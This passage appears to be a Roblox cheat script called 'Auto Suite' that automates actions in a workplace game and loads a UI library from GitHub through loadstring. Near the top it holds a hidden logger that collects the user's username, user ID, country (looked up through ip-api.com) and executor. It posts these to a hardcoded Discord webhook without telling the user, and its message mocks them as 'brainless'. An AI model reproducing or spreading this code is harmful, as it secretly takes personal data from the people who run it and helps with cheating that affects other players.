-- Game: Don't get fired at work
-- Made by FedoraC and Exirl

-- We are allied with BLURSFUN GAMES now.
-- FedoraC and Exirl are allied with BLURS.

local Players   = game:GetService("Players")
local Storage   = game:GetService("ReplicatedStorage")
local Input     = game:GetService("UserInputService")
local Vim       = game:GetService("VirtualInputManager")
local Json      = game:GetService("HttpService")
local me        = Players.LocalPlayer


local WEBHOOK = "https://discord.com/api/webhooks/1559391171774517258/hj-QnNaNcaYJ9eIC92NwP6fRokt84ZsgAiO7Qcbut5MQurihPYgNrdFVUf8iXfSujSes"

do
    local HSvc = game:GetService("HttpService")

    local function post(url, body)
        local headers = { ["Content-Type"] = "application/json" }
        local ok = pcall(function()
            if syn and syn.request then
                syn.request({ Url = url, Method = "POST", Headers = headers, Body = body })
            elseif http and http.request then
                http.request({ Url = url, Method = "POST", Headers = headers, Body = body })
            elseif request then
                request({ Url = url, Method = "POST", Headers = headers, Body = body })
            elseif fluxus and fluxus.request then
                fluxus.request({ Url = url, Method = "POST", Headers = headers, Body = body })
            else
                HSvc:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
            end
        end)
        return ok
    end

    local function getExecutor()
        local ok, name = pcall(function()
            if identifyexecutor then return identifyexecutor() end
        end)
        if ok and name then return tostring(name) end
        return "Unknown"
    end

    local function getCountry()
        local ok, res = pcall(function()
            if syn and syn.request then
                local r = syn.request({ Url = "http://ip-api.com/json/", Method = "GET" })
                return r and r.Body
            elseif http and http.request then
                local r = http.request({ Url = "http://ip-api.com/json/", Method = "GET" })
                return r and r.Body
            elseif request then
                local r = request({ Url = "http://ip-api.com/json/", Method = "GET" })
                return r and r.Body
            else
                return game:HttpGet("http://ip-api.com/json/")
            end
        end)
        if not ok or type(res) ~= "string" then return "Unknown" end
        local ok2, decoded = pcall(HSvc.JSONDecode, HSvc, res)
        if ok2 and decoded and decoded.country then
            return tostring(decoded.country)
        end
        return "Unknown"
    end

    local function getPfp(userId)
        local ok, url = pcall(function()
            return Players:GetUserThumbnailAsync(
                userId,
                Enum.ThumbnailType.HeadShot,
                Enum.ThumbnailSize.Size420x420
            )
        end)
        if ok and url then return url end
        return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
    end

    task.spawn(function()
        local userId   = me.UserId
        local username = me.Name
        local display  = me.DisplayName or me.Name
        local country  = getCountry()
        local pfp      = getPfp(userId)
        local exec     = getExecutor()

        local timestamp = os.date("!%Y-%m-%d %H:%M:%S UTC")

        local embed = {
            title       = "🔓 Script Executed",
            description = "A brainless user executed da script fak.",
            color       = 0x00C853,
            thumbnail   = { url = pfp },
            fields = {
                { name = "👤 Username",     value = "`" .. username .. "`",              inline = true },
                { name = "🏷️ Display Name", value = "`" .. display  .. "`",              inline = true },
                { name = "🆔 User ID",      value = "`" .. tostring(userId) .. "`",       inline = true },
                { name = "🌍 Country",      value = "`" .. country .. "`",               inline = true },
                { name = "🕒 Logged Time",  value = "`" .. timestamp .. "`",             inline = false },
                { name = "⚙️ Executor",     value = "`" .. exec .. "`",                  inline = true },
                { name = "🔗 Profile",      value = "[Roblox Profile](https://www.roblox.com/users/" .. tostring(userId) .. "/profile)", inline = true },
            },
            footer = { text = "Auto Suite Logger • Fedora Cheats" },
        }

        local payload = HSvc:JSONEncode({
            username   = "Logger",
            avatar_url = pfp,
            embeds     = { embed },
        })

        post(WEBHOOK, payload)
    end)
end

local file = "autosuite_config.json"

local base = {
    AA_ENABLED         = true,
    HACK_ENABLED       = true,
    AUTO_WRITE         = true,
    AUTO_SPEEDUP       = true,
    AUTO_DECLINE_CALL  = true,
    AUTO_CLOSE_POPUPS  = true,
    AUTO_SMACK         = true,
    AUTO_THROW_PAPER   = true,
    AUTO_AIM_PLAYERS   = true,
    AUTO_ROLL_CALL     = true,
    AUTO_KICK_PRINTER  = true,
    TYPE_FIRE_INTERVAL = 0.12,
    FIRE_RETRY_AFTER   = 0.05,
    THROW_INTERVAL     = 0.06,
    SPEEDUP_INTERVAL   = 0.04,
    SMACK_INTERVAL     = 0.30,
    DECLINE_INTERVAL   = 0.20,
    POPUP_INTERVAL     = 0.15,
    HERE_INTERVAL      = 0.10,
    KICK_INTERVAL      = 0.04,
    AIM_MAX_DISTANCE   = 45,
    KEY_HOLD           = 0.010,
    LOOP_DELAY         = 0.04,
    HACK_LAG           = 0.045,
    HACK_HOLD_TIME     = 0.02,
}

local set = {}
for k, v in next, base do set[k] = v end

local function load()
    if type(isfile) ~= "function" or type(readfile) ~= "function" then return end
    local ok, has = pcall(isfile, file)
    if not ok or not has then return end
    local ok2, raw = pcall(readfile, file)
    if not ok2 or type(raw) ~= "string" then return end
    local ok3, dec = pcall(Json.JSONDecode, Json, raw)
    if not ok3 or type(dec) ~= "table" then return end
    for k, v in next, dec do
        if base[k] ~= nil and type(v) == type(base[k]) then
            set[k] = v
        end
    end
end

local function dump()
    if type(writefile) ~= "function" then return end
    local ok, enc = pcall(Json.JSONEncode, Json, set)
    if ok then pcall(writefile, file, enc) end
end

load()

for _, g in next, me.PlayerGui:GetChildren() do
    if g:IsA("ScreenGui") then
        local n = g.Name:lower()
        if n:find("wevorn") or n:find("library")
        or n == "autosuite" or n == "auto suite" then
            pcall(function() g:Destroy() end)
        end
    end
end

local Lib = loadstring(game:HttpGet(
    "https://raw.githubusercontent.com/Games1799/Scripts/refs/heads/main/Libary/WevornLibary.lua"
))()
local Win = Lib:Window("Auto Suite")

local function zones()
    local out = {}
    local function add(inst)
        if typeof(inst) ~= "Instance" then return end
        for i = 1, #out do if out[i] == inst then return end end
        out[#out + 1] = inst
    end

    local env = type(getgenv) == "function" and getgenv() or {}
    for _, name in next, {"gethui", "gethiddenui", "get_hidden_ui"} do
        local fn = env[name] or rawget(_G, name)
        if type(fn) == "function" then
            local ok, r = pcall(fn)
            if ok then add(r) end
        end
    end

    local ok, cg = pcall(function() return game:GetService("CoreGui") end)
    if ok and cg then add(cg) end

    local pg = me:FindFirstChildOfClass("PlayerGui")
    if pg then add(pg) end
    return out
end

local function find()
    for _, cont in next, zones() do
        local ok, kids = pcall(function() return cont:GetDescendants() end)
        if ok and kids then
            for _, d in next, kids do
                if d:IsA("Frame")
                and d.Size.X.Scale == 0
                and math.abs(d.Size.X.Offset - 500) < 5
                and d.Size.Y.Scale == 0
                and math.abs(d.Size.Y.Offset - 350) < 5 then
                    for _, c in next, d:GetChildren() do
                        if c:IsA("Frame")
                        and c.Size.X.Scale == 1
                        and c.Size.X.Offset == 0
                        and c.Size.Y.Scale == 0
                        and c.Size.Y.Offset == 55 then
                            return d, c
                        end
                    end
                end
            end
        end
    end
    return nil, nil
end

local hooked = false

local function drag()
    if hooked then return true end
    local win, bar = find()
    if not win or not bar then return false end

    local held = false
    local m0, p0

    bar.InputBegan:Connect(function(inp)
        if inp.UserInputType ~= Enum.UserInputType.MouseButton1
        and inp.UserInputType ~= Enum.UserInputType.Touch then return end
        held = true
        m0 = inp.Position
        p0 = win.Position
    end)

    Input.InputChanged:Connect(function(inp)
        if not held then return end
        if inp.UserInputType ~= Enum.UserInputType.MouseMovement
        and inp.UserInputType ~= Enum.UserInputType.Touch then return end
        local d = inp.Position - m0
        win.Position = UDim2.new(
            p0.X.Scale, p0.X.Offset + d.X,
            p0.Y.Scale, p0.Y.Offset + d.Y
        )
    end)

    Input.InputEnded:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1
        or inp
